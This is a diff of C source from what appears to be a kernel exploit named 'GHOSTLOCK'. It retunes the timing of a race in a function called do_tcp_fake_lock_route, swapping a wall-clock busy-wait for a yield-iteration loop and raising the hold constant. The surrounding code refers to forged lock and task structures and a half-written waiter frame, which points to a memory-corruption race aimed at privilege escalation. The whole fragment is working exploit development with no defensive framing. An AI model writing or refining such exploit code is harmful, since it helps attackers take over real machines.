@@ -21,7 +21,7 @@ int route_last_errno;
  * lottery and the cap only bounds a losing run */
 #define TCP_ROUTE_ATTEMPTS 2000
 #define TCP_ARM_SEQ 16
-#define TCP_POST_GETSOCKOPT_HOLD_USEC 400
+#define TCP_POST_GETSOCKOPT_HOLD 20000
 /* compact pselect retry */
 #define PSELECT_CFI_ROUTE_ATTEMPTS 4
 
@@ -99,12 +99,10 @@ static int tcp_make_pair(int *client_fd, int *server_fd) {
   return 0;
 }
 
-/* Bounded busy-wait so the timing is wall clock, not a yield count whose cost
- * swings with core speed and thermal state. */
-static void spin_usec(long usec) {
-  struct timespec ref;
-  clock_gettime(CLOCK_MONOTONIC, &ref);
-  while (fops_elapsed_ms(&ref) * 1000.0 < (double)usec) {
+/* tcp: bounded busy-wait, counted in yield iterations to match the upstream
+ * validated constant (tcp_post_receive_hold_iterations). */
+static void spin_iters(long iters) {
+  for (long i = 0; i < iters; i++) {
     __asm__ volatile("yield" ::: "memory");
   }
 }
@@ -207,10 +205,10 @@ void do_tcp_fake_lock_route(void) {
   int attempts = env_int("GHOSTLOCK_TCP_ATTEMPTS", TCP_ROUTE_ATTEMPTS,
                          1, 100000);
   /* settle the puncher before arming; sweep with GHOSTLOCK_TCP_ARM_SEQ.
-   * post_hold is a wall-clock hold so it does not depend on core speed */
+   * hold is in yield iterations, the upstream validated unit */
   int arm_seq = env_int("GHOSTLOCK_TCP_ARM_SEQ", TCP_ARM_SEQ, 0, attempts);
-  int post_hold = env_int("GHOSTLOCK_TCP_POST_HOLD_USEC",
-                          TCP_POST_GETSOCKOPT_HOLD_USEC, 0, 100000);
+  int post_hold = env_int("GHOSTLOCK_TCP_POST_HOLD", TCP_POST_GETSOCKOPT_HOLD,
+                          0, 10000000);
 
   pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
           "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
@@ -260,7 +258,7 @@ void do_tcp_fake_lock_route(void) {
      * waiter frame; earlier release walks a half-written waiter */
     if (i >= arm_seq && ret == 0) {
       atomic_store(&punch_consume_go, i);
-      spin_usec(post_hold);
+      spin_iters(post_hold);
       tcp_wait_for_consumer_idle();
     }
 
